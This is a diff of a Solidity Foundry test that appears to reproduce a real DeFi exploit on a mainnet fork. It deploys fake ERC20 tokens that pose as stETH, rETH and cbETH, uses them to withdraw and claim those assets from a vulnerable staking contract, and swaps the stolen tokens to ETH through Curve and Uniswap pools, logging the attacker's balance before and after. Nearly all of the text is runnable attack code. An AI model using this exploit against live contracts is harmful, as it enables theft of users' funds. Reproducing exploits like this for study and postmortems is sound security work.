@@ -103,47 +103,41 @@ contract ASTTest is Test {
         cheats.createSelectFork("https://rpc.ankr.com/eth", 18_448_167);
     }
     function testExpolit()public{
+        address[] memory stakedTokens = new address[](3);
+        stakedTokens[0] = address(stETH);
+        stakedTokens[1] = address(rETH);
+        stakedTokens[2] = address(cbETH);
         deal(address(this), 0);
-        uint stETH_bal = stETH.balanceOf(address(vulnerable));
-        MyERC20 MyToken1 = new MyERC20();
-        MyToken1.setStakedTokenAddress(address(stETH));
-        MyToken1.setScaledBalanceToBalance(stETH_bal);
-        MyToken1.mint(10_000 * 1e18);
-        MyToken1.approve(address(vulnerable),type(uint).max);
+        uint[] memory balances = new uint[](3);
+        emit log_named_decimal_uint("Attacker Eth balance before attack:", address(this).balance, 18);
+        for(uint8 i = 0; i < stakedTokens.length; i++){
+            uint staked_bal = IERC20(stakedTokens[i]).balanceOf(address(vulnerable));
+            balances[i] = staked_bal;
+            MyERC20 MyToken = new MyERC20();
+            MyToken.setStakedTokenAddress(stakedTokens[i]);
+            MyToken.setScaledBalanceToBalance(staked_bal);
+            MyToken.mint(10_000 * 1e18);
+            MyToken.approve(address(vulnerable),type(uint).max);
 
-        vulnerable.withdraw(address(MyToken1), stETH_bal);
-        vulnerable.claim(0);
-        emit log_named_decimal_uint("stETH attacker bal:",stETH.balanceOf(address(this)),stETH.decimals());
+            vulnerable.withdraw(address(MyToken), staked_bal);
+            vulnerable.claim(i);
 
-        uint rETH_bal = rETH.balanceOf(address(vulnerable));
-        MyERC20 MyToken2 = new MyERC20();
-        MyToken2.setStakedTokenAddress(address(rETH));
-        MyToken2.setScaledBalanceToBalance(rETH_bal);
-        MyToken2.mint(10000 * 1e18);
-        MyToken2.approve(address(vulnerable),type(uint).max);
+        }
 
-        vulnerable.withdraw(address(MyToken2), rETH_bal);
-        vulnerable.claim(1);
-        emit log_named_decimal_uint("rETH attacker bal:",rETH.balanceOf(address(this)),rETH.decimals());
+        //changing stETH to eth
+        stETH.approve(address(LidoCurvePool),balances[0]);
+        LidoCurvePool.exchange(1,0,balances[0],0);
 
-        uint cbETH_bal = cbETH.balanceOf(address(vulnerable));
-        MyERC20 MyToken3 = new MyERC20();
-        MyToken3.setStakedTokenAddress(address(cbETH));
-        MyToken3.setScaledBalanceToBalance(cbETH_bal);
-        MyToken3.mint(10000 * 1e18);
-        MyToken3.approve(address(vulnerable),type(uint).max);
+        //changing rETH to weth
+        rETH.approve(address(rETHPool),balances[1]);
+        rETHPool.swap(address(this),true,int256(balances[1]),4_295_128_740,new bytes(0));
 
-        vulnerable.withdraw(address(MyToken3), cbETH_bal);
-        vulnerable.claim(2);
-        emit log_named_decimal_uint("cbETH attacker bal:",cbETH.balanceOf(address(this)),cbETH.decimals());
-        stETH.approve(address(LidoCurvePool),type(uint).max);
-        LidoCurvePool.exchange(1,0,stETH_bal,0);
-        rETH.approve(address(rETHPool),type(uint).max);
-        cbETH.approve(address(cbETHPool),type(uint).max);
-        rETHPool.swap(address(this),true,int256(rETH_bal),4_295_128_740,new bytes(0));
-        cbETHPool.swap(address(this),true,int256(cbETH_bal),4_295_128_740,new bytes(0));
+        //changing cbETH to weth
+        cbETH.approve(address(cbETHPool),balances[2]);
+        cbETHPool.swap(address(this),true,int256(balances[2]),4_295_128_740,new bytes(0));
+
         WETH.withdraw(WETH.balanceOf(address(this)));
-        emit log_named_decimal_uint("ETH bal:",address(this).balance, 18);
+        emit log_named_decimal_uint("Attacker Eth balance after attack:", address(this).balance, 18);
 
     }
     function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
